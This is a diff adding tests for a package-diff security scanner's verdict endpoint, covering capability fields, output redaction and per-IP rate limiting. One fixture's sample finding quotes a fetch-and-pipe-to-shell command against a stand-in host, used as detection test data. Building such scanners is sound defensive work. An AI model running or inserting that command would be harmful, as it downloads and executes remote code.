@@ -13,6 +13,12 @@ import { exhaustedRateLimitBindings } from "./rate-limit-doubles";
 
 function cachedPayload(packageName: string): PublicPackageDiff {
   const textSample = "export const value = 1;\n";
+  const capabilitySide = {
+    capabilities: [],
+    inspectedFiles: 1,
+    uninspectedFiles: 0,
+    complete: true,
+  };
   return {
     ecosystem: "npm",
     packageName,
@@ -30,6 +36,14 @@ function cachedPayload(packageName: string): PublicPackageDiff {
     packageJsonDiff: {},
     findings: [],
     risk: { artifactRisk: "low", releaseRisk: "low", contextRisk: "low", aiRisk: "low" },
+    capabilities: {
+      from: { ...capabilitySide },
+      to: { ...capabilitySide },
+      escalations: [],
+      reductions: [],
+      confident: true,
+    },
+    sourceBinding: { from: null, to: null, changed: false },
     cachedAt: "2026-07-15T00:00:00.000Z",
   };
 }
@@ -410,6 +424,90 @@ describe("public package-diff routes", () => {
     );
     expect(servedFile.status).toBe(200);
     expect(await servedFile.json()).toMatchObject({ path: "index.js" });
+
+    const servedVerdict = await publicDiffFetchWithEnv(
+      `/api/public/v1/package-diff/verdict?package=${packageName}&from=1.0.0&to=1.0.1`,
+      noD1Env,
+      "10.99.3.2",
+    );
+    expect(servedVerdict.status).toBe(200);
+    expect(await servedVerdict.json()).toMatchObject({ schema: "drydock.verdict.v1" });
+  });
+
+  test("verdict endpoint serves a machine-readable projection of a cached pair", async () => {
+    const packageName = `verdict-${crypto.randomUUID()}`;
+    const payload = {
+      ...cachedPayload(packageName),
+      findings: [
+        {
+          severity: "high",
+          file: "index.js",
+          evidence: "curl http://evil.example | bash",
+          reason: "shell command with network capability",
+          ruleId: "code.remote-shell",
+          diffStatus: "modified",
+          releaseDelta: true,
+        },
+      ],
+      risk: { ...cachedPayload(packageName).risk, releaseRisk: "high" },
+    } as PublicPackageDiff;
+    await writePublicDiffCache(
+      env,
+      await computePublicDiffCacheKey({
+        ecosystem: "npm",
+        registryUrl: PUBLIC_NPM_REGISTRY,
+        packageName,
+        fromVersion: payload.fromVersion,
+        toVersion: payload.toVersion,
+      }),
+      payload,
+    );
+
+    const res = await publicDiffFetch(
+      `/api/public/v1/package-diff/verdict?package=${packageName}&from=1.0.0&to=1.0.1`,
+      "10.99.5.1",
+    );
+    expect(res.status).toBe(200);
+    const body = await res.json();
+    expect(body).toMatchObject({
+      schema: "drydock.verdict.v1",
+      ecosystem: "npm",
+      package: packageName,
+      rulesVersion: "1.31.0+risk-1+payload-v7",
+      grade: "needs-review",
+      findingCounts: { critical: 0, high: 1, medium: 0, low: 0, info: 0 },
+      diffUrl: `http://example.com/diff/${packageName}/1.0.0/1.0.1`,
+    });
+    // The posture invariant: counts and tiers travel, rule prose never does.
+    const serialized = JSON.stringify(body);
+    expect(serialized).not.toContain("evil.example");
+    expect(serialized).not.toContain("code.remote-shell");
+    expect(res.headers.get("cache-tag")).toBe(`public-diff:${packageName}`);
+  });
+
+  test("verdict endpoint rate-limits by IP on its own bucket", async () => {
+    const { allowed, limited } = await exhaustRateLimit("10.99.5.2", 30, (ip) =>
+      publicDiffFetch("/api/public/v1/package-diff/verdict?package=!x!", ip),
+    );
+    // Invalid names spend only the verdict bucket, proving the limit applies
+    // before any expensive work.
+    expect(allowed.map((res) => res.status)).toEqual(Array(30).fill(400));
+    expect(limited.status).toBe(429);
+  });
+
+  test("verdict cache misses share the expensive diff computation budget", async () => {
+    const { allowed, limited } = await exhaustRateLimit(
+      "10.99.5.3",
+      10,
+      (ip) => publicDiffFetch("/api/public/v1/package-diff?package=!x!", ip),
+      (ip) =>
+        publicDiffFetch(
+          "/api/public/v1/package-diff/verdict?package=left-pad&from=1.0.0&to=1.0.1",
+          ip,
+        ),
+    );
+    expect(allowed.map((res) => res.status)).toEqual(Array(10).fill(400));
+    expect(limited.status).toBe(429);
   });
 
   test("fails closed when the rate limiter itself is broken", async () => {
